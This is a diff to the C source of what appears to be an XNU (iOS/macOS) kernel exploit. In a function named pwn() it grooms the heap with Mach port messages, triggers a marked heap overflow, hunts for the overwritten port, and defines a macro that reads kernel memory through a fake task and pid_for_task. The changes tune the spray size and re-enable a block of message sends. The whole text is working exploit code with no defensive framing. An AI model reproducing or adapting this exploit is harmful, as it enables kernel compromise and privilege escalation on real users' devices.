@@ -27,6 +27,9 @@
 #define IKOT_IOKIT_CONNECT 29
 #define IKOT_CLOCK 25
 
+#define SIZE 0x100
+
+
 #define kr32(address, value)\
 *(uint64_t*) (faketask + 0x380) = address - 0x10;\
 pid_for_task(foundport, value);
@@ -215,7 +218,7 @@ int pwn()
     msg1.head.msgh_size = sizeof(msg1)-2048;
     msg1.msgh_body.msgh_descriptor_count = 1;
     msg1.desc[0].address = buffer;
-    msg1.desc[0].count = 0x100/8; //32
+    msg1.desc[0].count = SIZE/8; //32
     msg1.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
     msg1.desc[0].disposition = MACH_MSG_TYPE_COPY_SEND;
     
@@ -229,14 +232,14 @@ int pwn()
     
     // recv 300 - 500 i+=4
     pthread_yield_np();
-    for (int i = 384; i<500; i+=4) {
+    for (int i = 300; i<500; i+=4) {
         msg2.head.msgh_local_port = ports[i];
         kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
         if(!(i < 380))
             ports[i] = 0;
         assert(kret==0);
     }
-    /*
+    
     //send 300 - 380 i+=4
     pthread_yield_np();
     for (int i = 300; i<380; i+=4) {
@@ -244,10 +247,10 @@ int pwn()
         kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
         assert(kret==0);
     }
-    */
+    
     //fakeport=0x6161616161616161;
     //heap overflow here!
-    if(do_overflow(0x100, 8, (uint8_t*)&fakeport)==-1)
+    if(do_overflow(SIZE, 8, (uint8_t*)&fakeport)==-1)
         return -1;
 
     // 300 - 500 find overflow port
@@ -260,7 +263,7 @@ int pwn()
             assert(kret==0);
             for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
                 mach_port_t* ptz = msg1.desc[k].address;
-                for (int z = 0; z < 0x100/8; z++) {
+                for (int z = 0; z < SIZE/8; z++) {
                     if (ptz[z] != MACH_PORT_DEAD) {
                         printf("ptz[z]=0x%x\n",ptz[z]);
                         if (ptz[z]) {
